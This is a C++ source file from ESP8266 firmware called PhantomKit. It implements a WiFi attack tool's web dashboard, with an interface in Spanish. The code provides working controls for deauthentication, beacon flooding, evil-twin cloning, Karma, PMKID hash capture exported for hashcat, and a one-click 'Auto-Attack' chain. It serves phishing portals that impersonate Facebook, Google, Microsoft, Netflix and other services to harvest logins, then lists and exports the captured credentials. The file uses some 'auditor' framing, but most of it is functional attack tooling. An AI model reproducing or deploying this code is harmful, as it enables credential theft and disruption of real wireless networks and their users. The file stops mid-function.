#include "web_server.h"
#include "config.h"
#include <LittleFS.h>
#include "../notifier.h"

extern NotifierModule notifier;
extern PMKIDCaptureModule pmkidModule;
extern void karmaCallback(const String& ssid, int tpl);
extern APManager apManager;
extern CaptivePortal captivePortal;

extern String logBuffer;

const char DASH_CSS[] PROGMEM = R"rawliteral(
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.c{max-width:1200px;margin:0 auto;padding:16px}
header{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #1a1a2e;margin-bottom:16px}
.logo{display:flex;align-items:center;gap:12px}
.li{background:linear-gradient(135deg,#00d4ff,#7b2ff7);color:#000;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-weight:900;border-radius:6px}
h1{font-size:20px;color:#00d4ff;font-family:system-ui}
.st{display:flex;align-items:center;gap:8px;font-size:13px}
.dot{width:8px;height:8px;border-radius:50%;background:#333}
.dot.a{background:#00ff88;box-shadow:0 0 8px #00ff88}
.tabs{display:flex;gap:2px;margin-bottom:16px;border-bottom:1px solid #1a1a2e;overflow-x:auto}
.tab{background:none;border:none;color:#666;padding:10px 16px;cursor:pointer;font-family:inherit;font-size:12px;text-transform:uppercase;border-bottom:2px solid transparent;white-space:nowrap}
.tab:hover{color:#e0e0e0}
.tab.a{color:#00d4ff;border-bottom-color:#00d4ff}
.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
.card{background:#12121a;border:1px solid #1a1a2e;border-radius:8px;padding:16px}
.card.f{grid-column:1/-1}
.card h2{font-size:13px;color:#00d4ff;margin-bottom:12px;text-transform:uppercase}
.fg{margin-bottom:12px}
.fg label{display:block;font-size:10px;color:#666;margin-bottom:4px;text-transform:uppercase}
.sd{background:#1a1a2e;padding:8px;border-radius:4px;font-size:13px;color:#00d4ff}
.ir{display:flex;gap:8px}
.ir input{flex:1;background:#1a1a2e;border:1px solid #1a1a2e;color:#e0e0e0;padding:8px;border-radius:4px;font-family:inherit}
input:focus,select:focus{outline:none;border-color:#00d4ff}
select{width:100%;background:#1a1a2e;border:1px solid #1a1a2e;color:#e0e0e0;padding:8px;border-radius:4px;font-family:inherit}
input[type=number],input[type=text]{width:100%;background:#1a1a2e;border:1px solid #1a1a2e;color:#e0e0e0;padding:8px;border-radius:4px;font-family:inherit}
.bg{display:flex;gap:8px;margin-top:16px}
.bs,.bp,.bd{padding:8px 16px;border:none;border-radius:4px;font-family:inherit;font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase}
.bs{background:#00d4ff;color:#000}
.bp{background:#1a1a2e;color:#e0e0e0}
.bd{background:#ff4444;color:#fff}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.stat{text-align:center;padding:12px 8px;background:#1a1a2e;border-radius:6px}
.sv{display:block;font-size:20px;font-weight:700;color:#00d4ff}
.sl{display:block;font-size:9px;color:#666;margin-top:2px;text-transform:uppercase}
table{width:100%;border-collapse:collapse}
th,td{padding:8px;text-align:left;border-bottom:1px solid #1a1a2e}
th{color:#666;font-size:9px;text-transform:uppercase}
td{font-size:11px}
#ct,#lt{max-height:200px;overflow-y:auto}
#lc{background:#050508;border:1px solid #1a1a2e;border-radius:6px;padding:12px;font-family:monospace;font-size:11px;color:#00ff88;max-height:150px;overflow-y:auto;white-space:pre-wrap;line-height:1.5}
.e{color:#333;text-align:center;padding:16px;font-style:italic}
.ti{display:flex;justify-content:space-between;align-items:center;padding:8px;background:#1a1a2e;border-radius:4px;margin-bottom:6px;cursor:pointer}
.ti:hover{background:#2a2a3e}
.ts{font-size:12px;color:#e0e0e0;font-weight:600}
.tb{font-size:10px;color:#666}
.tr{font-size:11px;color:#00d4ff}
@media(max-width:600px){.g{grid-template-columns:1fr}}
)rawliteral";

const char DASH_JS[] PROGMEM = R"rawliteral(
function e(v){return String(v==null?'':v).replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})}
function j(v){return String(v==null?'':v).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'&quot;').replace(/</g,'\\x3c').replace(/>/g,'\\x3e')}
function showTab(btn,name){var tabs=document.querySelectorAll('[id^=tab-]');for(var i=0;i<tabs.length;i++)tabs[i].style.display='none';var btns=document.querySelectorAll('.tab');for(var i=0;i<btns.length;i++)btns[i].classList.remove('a');document.getElementById('tab-'+name).style.display='block';btn.classList.add('a')}
function p(u,d){return fetch(u,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:d})}
function uS(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){document.getElementById('sd').className='dot'+(d.portal_active?' a':'');document.getElementById('st').textContent=d.portal_active?'Activo':'Inactivo';document.getElementById('sC').textContent=d.clients;document.getElementById('sR').textContent=d.credentials;document.getElementById('sT').textContent=d.template_name;document.getElementById('cs').textContent=d.ssid;document.getElementById('bS').style.display=d.portal_active?'none':'block';document.getElementById('bP').style.display=d.portal_active?'block':'none';document.getElementById('sDF').textContent=d.deauth_frames;document.getElementById('sDS').textContent=d.deauth_active?'Activo':'Inactivo';document.getElementById('sDS').style.color=d.deauth_active?'#ff4444':'#666';document.getElementById('sBC').textContent=d.beacon_count;document.getElementById('sBS').textContent=d.beacon_active?'Activo':'Inactivo';document.getElementById('sBS').style.color=d.beacon_active?'#ff4444':'#666';document.getElementById('sPC').textContent=d.probe_count;document.getElementById('sPS').textContent=d.probe_active?'Activo':'Inactivo';document.getElementById('sES').textContent=d.eviltwin_active?'Activo':'Inactivo';document.getElementById('sES').style.color=d.eviltwin_active?'#ff4444':'#666'})}
function uC(){fetch('/api/credentials').then(function(r){return r.json()}).then(function(d){if(d.length===0){document.getElementById('ct').innerHTML='<p class=e>Sin credenciales</p>';return}var h='<table><thead><tr><th>Template</th><th>Campo1</th><th>Campo2</th><th>Hora</th></tr></thead><tbody>';for(var i=0;i<d.length;i++){var c=d[i];h+='<tr><td>'+e(c.template)+'</td><td>'+e(c.field1)+'</td><td>'+e(c.field2)+'</td><td>'+e(c.time)+'</td></tr>'}h+='</tbody></table>';document.getElementById('ct').innerHTML=h})}
function uL(){fetch('/api/log').then(function(r){return r.text()}).then(function(d){document.getElementById('lc').textContent=d})}
function tP(s){p('/api/control','action='+(s?'start':'stop')).then(uS)}
document.getElementById('ts').addEventListener('change',function(){p('/api/template','index='+this.value).then(uS)})
function cSSID(){var v=document.getElementById('si').value;if(v.length>0){p('/api/ssid','ssid='+v).then(function(){uS();document.getElementById('si').value=''})}}
function scanD(){p('/api/deauth','action=scan').then(function(r){return r.text()}).then(function(d){try{var t=JSON.parse(d);var h='';for(var i=0;i<t.length;i++){var x=t[i];h+='<div class=ti onclick="selD(\''+j(x.bssid)+'\','+Number(x.channel)+')"><div><div class=ts>'+e(x.ssid)+'</div><div class=tb>'+e(x.bssid)+'</div></div><div class=tr>'+e(x.rssi)+'dBm</div></div>'}document.getElementById('dt').innerHTML=h||'<p class=e>Sin redes</p>'}catch(err){}})}
function selD(b,c){document.getElementById('dB').value=b;document.getElementById('dCh').value=c}
function startD(){var b=document.getElementById('dB').value;var c=document.getElementById('dCh').value;if(b&&c){p('/api/deauth','action=start&bssid='+b+'&channel='+c).then(function(){uS();document.getElementById('bDS').style.display='none';document.getElementById('bDP').style.display='block'})}}
function stopD(){p('/api/deauth','action=stop').then(function(){uS();document.getElementById('bDS').style.display='block';document.getElementById('bDP').style.display='none'})}
function startB(){p('/api/beacon','action=start&channel='+document.getElementById('bCh').value).then(function(){uS();document.getElementById('bBS').style.display='none';document.getElementById('bBP').style.display='block'})}
function stopB(){p('/api/beacon','action=stop').then(function(){uS();document.getElementById('bBS').style.display='block';document.getElementById('bBP').style.display='none'})}
function startP(){p('/api/probe','action=start&channel='+document.getElementById('pCh').value).then(function(){uS();document.getElementById('bPS').style.display='none';document.getElementById('bPP').style.display='block'})}
function stopP(){p('/api/probe','action=stop').then(function(){uS();document.getElementById('bPS').style.display='block';document.getElementById('bPP').style.display='none'})}
function scanE(){p('/api/eviltwin','action=scan').then(function(r){return r.text()}).then(function(d){try{var t=JSON.parse(d);var h='';for(var i=0;i<t.length;i++){var x=t[i];h+='<div class=ti onclick="selE(\''+j(x.ssid)+'\',\''+j(x.bssid)+'\','+Number(x.channel)+')"><div><div class=ts>'+e(x.ssid)+'</div><div class=tb>'+e(x.bssid)+'</div></div><div class=tr>'+e(x.rssi)+'dBm</div></div>'}document.getElementById('et').innerHTML=h||'<p class=e>Sin redes</p>'}catch(err){}})}
var selET={s:'',b:'',c:0};function selE(s,b,c){selET={s:s,b:b,c:c}}
function cloneE(){if(selET.b){p('/api/eviltwin','action=clone&ssid='+selET.s+'&bssid='+selET.b+'&channel='+selET.c).then(uS)}}
function stopE(){p('/api/eviltwin','action=stop').then(uS)}
uS();uC();uL();setInterval(uS,2000);setInterval(uC,3000);setInterval(uL,1000)
)rawliteral";

PhantomWebServer::PhantomWebServer(CredentialStore& store, CaptivePortal& portal, APManager& ap,
                                     DeauthModule& deauth, BeaconFloodModule& beacon,
                                     ProbeSnifferModule& probe, EvilTwinModule& evilTwin,
                                     AutoPortalModule& autoPortal, PMKIDCaptureModule& pmkid)
    : server(80), store(store), portal(portal), ap(ap),
      deauth(deauth), beacon(beacon), probe(probe),
      evilTwin(evilTwin), autoPortal(autoPortal), pmkid(pmkid) {
    failedLoginAttempts = 0;
    loginLockedUntil = 0;
    generateSessionToken();
}

// ---------------------------------------------------------------------------
// Authentication helpers
// ---------------------------------------------------------------------------

void PhantomWebServer::generateSessionToken() {
    sessionToken = "";
    randomSeed(ESP.getCycleCount() ^ micros() ^ analogRead(A0));
    const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < 32; i++) {
        sessionToken += alphabet[random(0, sizeof(alphabet) - 1)];
    }
}

bool PhantomWebServer::isAuthenticated() {
    if (server.hasHeader("Cookie")) {
        String cookie = server.header("Cookie");
        return cookie.indexOf("pk_session=" + sessionToken) != -1;
    }
    return false;
}

bool PhantomWebServer::defaultCredentialsActive() {
    return String(AP_PASSWORD) == "change-me-phantomkit" ||
           String(DASHBOARD_PASSWORD) == "change-me-auditor";
}

bool PhantomWebServer::loginLocked() {
    return loginLockedUntil != 0 && millis() < loginLockedUntil;
}

String PhantomWebServer::jsonEscape(const String& value) {
    String out;
    out.reserve(value.length() + 8);
    for (size_t i = 0; i < value.length(); i++) {
        char c = value[i];
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b"; break;
            case '\f': out += "\\f"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if ((uint8_t)c < 0x20) {
                    char buf[7];
                    snprintf(buf, sizeof(buf), "\\u%04x", (uint8_t)c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

void PhantomWebServer::requireAuth() {
    server.sendHeader("Location", "/dashboard/login");
    server.send(302, "text/plain", "");
}

void PhantomWebServer::handleLogin() {
    server.send(200, "text/html", getLoginHTML());
}

void PhantomWebServer::handleLoginPost() {
#if REQUIRE_CUSTOM_CREDENTIALS
    if (defaultCredentialsActive()) {
        server.send(403, "text/html",
            "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>PhantomKit Setup Required</title></head>"
            "<body style='background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:32px'>"
            "<h2 style='color:#ff4444'>Config required</h2>"
            "<p>Change AP_PASSWORD and DASHBOARD_PASSWORD in src/config.h before enabling the dashboard.</p>"
            "</body></html>");
        return;
    }
#endif

    if (loginLocked()) {
        server.send(429, "text/html",
            "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Locked</title></head>"
            "<body style='background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:32px'>"
            "<h2 style='color:#ff4444'>Too many attempts</h2><p>Wait before trying again.</p></body></html>");
        return;
    }

    String pw = server.arg("password");
    if (pw == String(DASHBOARD_PASSWORD)) {
        failedLoginAttempts = 0;
        loginLockedUntil = 0;
        generateSessionToken();
        server.sendHeader("Set-Cookie", "pk_session=" + sessionToken + "; Path=/; HttpOnly; SameSite=Strict");
        server.sendHeader("Location", "/dashboard");
        server.send(302, "text/plain", "");
    } else {
        failedLoginAttempts++;
        if (failedLoginAttempts >= LOGIN_MAX_ATTEMPTS) {
            loginLockedUntil = millis() + LOGIN_LOCKOUT_MS;
            failedLoginAttempts = 0;
        }
        server.send(200, "text/html",
            "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
            "<title>PhantomKit Login</title></head><body style='background:#0a0a0f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace'>"
            "<div style='background:#12121a;border:1px solid #1a1a2e;border-radius:8px;padding:32px;width:300px'>"
            "<h2 style='color:#00d4ff;margin:0 0 8px'>PhantomKit</h2>"
            "<p style='color:#ff4444;font-size:13px;margin:0 0 16px'>Contrasena incorrecta</p>"
            "<form method='POST' action='/dashboard/login'>"
            "<input type='password' name='password' placeholder='Contrasena' autofocus style='width:100%;box-sizing:border-box;padding:10px;background:#1a1a2e;border:1px solid #ff4444;color:#e0e0e0;border-radius:4px;font-family:monospace;margin-bottom:12px'>"
            "<button type='submit' style='width:100%;padding:10px;background:#00d4ff;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer;font-family:monospace'>Acceder</button>"
            "</form></div></body></html>");
    }
}

void PhantomWebServer::handleLogout() {
    server.sendHeader("Set-Cookie", "pk_session=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT");
    server.sendHeader("Location", "/dashboard/login");
    server.send(302, "text/plain", "");
}

String PhantomWebServer::getLoginHTML() {
    return "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
           "<title>PhantomKit Login</title></head>"
           "<body style='background:#0a0a0f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace'>"
           "<div style='background:#12121a;border:1px solid #1a1a2e;border-radius:8px;padding:32px;width:300px'>"
           "<div style='display:flex;align-items:center;gap:12px;margin-bottom:24px'>"
           "<div style='background:linear-gradient(135deg,#00d4ff,#7b2ff7);width:40px;height:40px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#000'>PK</div>"
           "<h2 style='color:#00d4ff;margin:0'>PhantomKit</h2></div>"
           "<p style='color:#666;font-size:11px;margin:0 0 16px;text-transform:uppercase'>Autenticacion requerida</p>"
           "<form method='POST' action='/dashboard/login'>"
           "<input type='password' name='password' placeholder='Contrasena de auditor' autofocus "
           "style='width:100%;box-sizing:border-box;padding:10px;background:#1a1a2e;border:1px solid #2a2a3e;color:#e0e0e0;border-radius:4px;font-family:monospace;margin-bottom:12px'>"
           "<button type='submit' style='width:100%;padding:10px;background:#00d4ff;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer;font-family:monospace'>Acceder</button>"
           "</form></div></body></html>";
}

void PhantomWebServer::handleAPIStealth() {
    String val = server.arg("enabled");
    bool enabled = (val == "true" || val == "1");
    ap.setStealthMode(enabled);
    server.send(200, "application/json", String("{\"stealth\":") + (enabled ? "true" : "false") + "}");
}

void PhantomWebServer::begin() {
    server.collectHeaders("Cookie", "Content-Type");

    // Auth routes (no authentication needed)
    server.on("/dashboard/login",  HTTP_GET,  [this]() { handleLogin(); });
    server.on("/dashboard/login",  HTTP_POST, [this]() { handleLoginPost(); });
    server.on("/dashboard/logout", HTTP_GET,  [this]() { handleLogout(); });
    server.on("/",       HTTP_GET,  [this]() {
        server.sendHeader("Location", "/dashboard");
        server.send(302, "text/plain", "");
    });

    // Protected routes
    server.on("/dashboard", HTTP_GET, [this]() {
        if (!isAuthenticated()) { requireAuth(); return; }
        handleDashboard();
    });
    server.on("/api/status", HTTP_GET, [this]() {
        if (!isAuthenticated()) { server.send(401, "application/json", "{\"error\":\"Unauthorized\"}"); return; }
        handleAPIStatus();
    });
    server.on("/api/credentials", HTTP_GET, [this]() {
        if (!isAuthenticated()) { server.send(401, "application/json", "{\"error\":\"Unauthorized\"}"); return; }
        handleAPICredentials();
    });
    server.on("/api/log", HTTP_GET, [this]() {
        if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
        handleAPILog();
    });
    server.on("/api/control",    HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIControl(); });
    server.on("/api/template",   HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPITemplate(); });
    server.on("/api/ssid",       HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPISSID(); });
    server.on("/api/clear",      HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIClear(); });
    server.on("/api/deauth",     HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIDeauth(); });
    server.on("/api/beacon",     HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIBeacon(); });
    server.on("/api/probe",      HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIProbe(); });
    server.on("/api/probe/devices", HTTP_GET, [this]() {
        if (!isAuthenticated()) { server.send(401, "application/json", "{\"error\":\"Unauthorized\"}"); return; }
        server.send(200, "application/json", probe.getDevicesJSON());
    });
    server.on("/api/eviltwin",   HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIEvilTwin(); });
    server.on("/api/autoportal", HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIAutoPortal(); });
    server.on("/api/stealth",    HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIStealth(); });
    server.on("/api/notify",     HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
        String url   = server.arg("url");
        String topic = server.arg("topic");
        String action = server.arg("action");
        if (action == "test") {
            notifier.configure(url, topic);
            bool ok = notifier.test();
            server.send(200, "application/json", String("{\"ok\":") + (ok ? "true" : "false") + "}");
        } else {
            notifier.configure(url, topic);
            notifier.saveConfig();
            server.send(200, "text/plain", "OK");
        }
    });
    server.on("/api/export/csv",    HTTP_GET, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIExportCSV(); });
    server.on("/api/export/report", HTTP_GET, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIExportReport(); });

    // Auto-Attack chain
    server.on("/api/autoattack", HTTP_POST, [this]() {
        if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
        handleAPIAutoAttack();
    });

    // Karma mode
    server.on("/api/karma", HTTP_POST, [this]() {
        if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
        handleAPIKarma();
    });

    // PMKID capture
    server.on("/api/pmkid",         HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIPMKID(); });
    server.on("/api/pmkid/results", HTTP_GET,  [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } server.send(200, "application/json", pmkid.getJSON()); });
    server.on("/api/pmkid/export",  HTTP_GET,  [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
        server.sendHeader("Content-Disposition", "attachment; filename=\"pmkids.hc22000\"");
        server.send(200, "text/plain", pmkid.getHashcatOutput());
    });

    server.on("/api/panic", HTTP_POST, [this]() {
        if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
        handleAPIPanic();
    });
    server.onNotFound([this]() {
        if (portal.isActive()) {
            String fn = String("/templates/") + TEMPLATES[portal.getCurrentTemplate()];
            if (LittleFS.exists(fn)) {
                File f = LittleFS.open(fn, "r");
                String c = f.readString();
                f.close();
                server.send(200, "text/html", c);
            } else {
                server.send(200, "text/html", "<html><body style='background:#f0f2f5;font-family:Arial'><div style='background:#fff;padding:30px;border-radius:8px;max-width:400px;margin:100px auto'><h2 style='color:#1877f2;text-align:center'>Iniciar Sesion</h2><form action='/login' method='POST'><input type='text' name='field1' placeholder='Email' style='width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px' required><input type='password' name='field2' placeholder='Contraseña' style='width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px' required><button style='width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px'>Continuar</button></form></div></body></html>");
            }
        } else {
            server.send(200, "text/html", "<html><body style='background:#0a0a0f;color:#e0e0e0;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0'><div style='text-align:center'><h1 style='color:#00d4ff'>PhantomKit</h1><p>Portal inactivo</p><a href='/dashboard' style='color:#00d4ff'>Dashboard</a></div></body></html>");
        }
    });
    server.begin();
}

void PhantomWebServer::handleClient() { server.handleClient(); }

void PhantomWebServer::handleDashboard() {
    String html;
    html.reserve(4096);
    
    html += "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>PhantomKit</title><style>";
    html += FPSTR(DASH_CSS);
    html += "</style></head><body><div class='c'>";
    
    html += "<header><div class='logo'><h1>PhantomKit</h1></div><div class='st'><span class='dot' id='sd'></span><span id='st'>Inactivo</span><a href='/dashboard/logout' style='margin-left:16px;color:#666;font-size:11px;text-decoration:none;padding:4px 8px;border:1px solid #1a1a2e;border-radius:4px'>Salir</a></div></header>";
    
    html += "<nav class='tabs'>";
    html += "<button class='tab a' onclick='showTab(this,\"portal\")'>Portal</button>";
    html += "<button class='tab' onclick='showTab(this,\"autoattack\")'>&#9889; Auto-Attack</button>";
    html += "<button class='tab' onclick='showTab(this,\"deauth\")'>Deauth</button>";
    html += "<button class='tab' onclick='showTab(this,\"beacon\")'>Beacon</button>";
    html += "<button class='tab' onclick='showTab(this,\"probe\")'>Probe</button>";
    html += "<button class='tab' onclick='showTab(this,\"pmkid\")'>PMKID</button>";
    html += "<button class='tab' onclick='showTab(this,\"eviltwin\")'>Evil Twin</button>";
    html += "<button class='tab' onclick='showTab(this,\"settings\")'>Ajustes</button>";
    html += "</nav>";
    
    html += "<div id='tab-autoattack' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>&#9889; Auto-Attack</h2>";
    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Un clic: escanea, cambia SSID, deautentica clientes y activa el portal con el template ideal.</p>";
    html += "<div class='fg'><button class='bp' onclick='scanAA()'>1. Escanear redes</button></div>";
    html += "<div id='aat'><p class='e'>Presiona Escanear</p></div>";
    html += "<div class='fg'><label>SSID objetivo (auto-detectado)</label><input type='text' id='aaSsid' placeholder='Red objetivo'></div>";
    html += "<div class='fg'><label>BSSID</label><input type='text' id='aaBssid' placeholder='AA:BB:CC:DD:EE:FF'></div>";
    html += "<div class='fg'><label>Canal</label><input type='number' id='aaCh' min='1' max='13' value='6'></div>";
    html += "<div id='aaTplMsg' style='font-size:11px;color:#00d4ff;margin-bottom:8px'></div>";
    html += "<div class='bg'>";
    html += "<button class='bd' id='bAAS' onclick='startAA()'>&#9889; ATACAR</button>";
    html += "<button class='bp' id='bAAP' onclick='stopAA()' style='display:none'>Detener</button>";
    html += "</div></div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sAAT'>-</span><span class='sl'>Template</span></div>";
    html += "<div class='stat'><span class='sv' id='sAAS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";

    html += "<div id='tab-portal'><div class='g'>";
    html += "<div class='card'><h2>Control del Portal</h2>";
    html += "<div class='fg'><label>SSID Actual</label><div class='sd' id='cs'>PhantomKit</div></div>";
    html += "<div class='fg'><label>Cambiar SSID</label><div class='ir'><input type='text' id='si' placeholder='Nuevo SSID' maxlength='32'><button class='bp' onclick='cSSID()'>Aplicar</button></div></div>";
    html += "<div class='fg'><label>Template</label><select id='ts'>";
    html += "<option value='0'>Facebook</option><option value='1'>Instagram</option><option value='2'>Microsoft</option>";
    html += "<option value='3'>X</option><option value='4'>Google</option><option value='5'>WiFi Login</option>";
    html += "<option value='6'>Netflix</option><option value='7'>WhatsApp</option>";
    html += "</select></div>";
    html += "<div class='bg'><button class='bs' id='bS' onclick='tP(1)'>Activar</button><button class='bp' id='bP' onclick='tP(0)' style='display:none'>Desactivar</button></div>";
    html += "</div>";
    
    html += "<div class='card'><h2>Estadisticas</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sC'>0</span><span class='sl'>Clientes</span></div>";
    html += "<div class='stat'><span class='sv' id='sR'>0</span><span class='sl'>Creds</span></div>";
    html += "<div class='stat'><span class='sv' id='sT'>-</span><span class='sl'>Template</span></div>";
    html += "</div></div>";
    
    html += "<div class='card f'><h2>Credenciales</h2><div id='ct'><p class='e'>Sin credenciales</p></div>";
    html += "<div class='bg' style='margin-top:12px'>";
    html += "<a href='/api/export/csv' class='bp' style='padding:8px 16px;border:none;border-radius:4px;font-family:inherit;font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;background:#1a1a2e;color:#e0e0e0;text-decoration:none'>Exportar CSV</a>";
    html += "<a href='/api/export/report' class='bp' style='padding:8px 16px;border:none;border-radius:4px;font-family:inherit;font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;background:#1a1a2e;color:#e0e0e0;text-decoration:none'>Exportar Reporte</a>";
    html += "</div></div>";
    html += "</div></div>";
    
    html += "<div id='tab-deauth' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Deauth Attack</h2>";
    html += "<div class='fg'><button class='bp' onclick='scanD()'>Escanear Redes</button></div>";
    html += "<div id='dt'><p class='e'>Presiona Escanear</p></div>";
    html += "<div class='fg'><label>BSSID</label><input type='text' id='dB' placeholder='AA:BB:CC:DD:EE:FF'></div>";
    html += "<div class='fg'><label>Canal</label><input type='number' id='dCh' placeholder='1' min='1' max='13'></div>";
    html += "<div class='bg'><button class='bd' id='bDS' onclick='startD()'>Iniciar</button><button class='bp' id='bDP' onclick='stopD()' style='display:none'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sDF'>0</span><span class='sl'>Frames</span></div>";
    html += "<div class='stat'><span class='sv' id='sDS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div id='tab-beacon' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Beacon Flood</h2>";
    html += "<p style='color:#666;font-size:12px;margin-bottom:12px'>Genera redes falsas</p>";
    html += "<div class='fg'><label>Canal</label><input type='number' id='bCh' value='6' min='1' max='13'></div>";
    html += "<div class='bg'><button class='bd' id='bBS' onclick='startB()'>Iniciar</button><button class='bp' id='bBP' onclick='stopB()' style='display:none'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sBC'>0</span><span class='sl'>Beacons</span></div>";
    html += "<div class='stat'><span class='sv' id='sBS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div id='tab-probe' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Probe Sniffer</h2>";
    html += "<p style='color:#666;font-size:12px;margin-bottom:12px'>Captura SSIDs buscados por dispositivos cercanos</p>";
    html += "<div class='fg'><label>Canal inicial</label><input type='number' id='pCh' value='1' min='1' max='13'></div>";
    html += "<div class='bg'><button class='bs' id='bPS' onclick='startP()'>Iniciar</button><button class='bp' id='bPP' onclick='stopP()' style='display:none'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card f'><h2>Dispositivos detectados</h2><div id='pd'><p class='e'>Inicia el sniffing para capturar dispositivos</p></div><button class='bp' style='margin-top:8px;font-size:11px' onclick='uP()'>Actualizar</button></div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sPC'>0</span><span class='sl'>Probes</span></div>";
    html += "<div class='stat'><span class='sv' id='sPD'>0</span><span class='sl'>Dispositivos</span></div>";
    html += "<div class='stat'><span class='sv' id='sPS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div id='tab-eviltwin' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Evil Twin</h2>";
    html += "<p style='color:#666;font-size:12px;margin-bottom:12px'>Clona una red</p>";
    html += "<div class='fg'><button class='bp' onclick='scanE()'>Escanear</button></div>";
    html += "<div id='et'><p class='e'>Presiona Escanear</p></div>";
    html += "<div class='bg'><button class='bd' onclick='cloneE()'>Clonar</button><button class='bp' onclick='stopE()'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sES'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "<div class='stat'><span class='sv' id='sET'>-</span><span class='sl'>Objetivo</span></div>";
    html += "</div></div></div></div>";

    // PMKID tab
    html += "<div id='tab-pmkid' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>PMKID Capture</h2>";
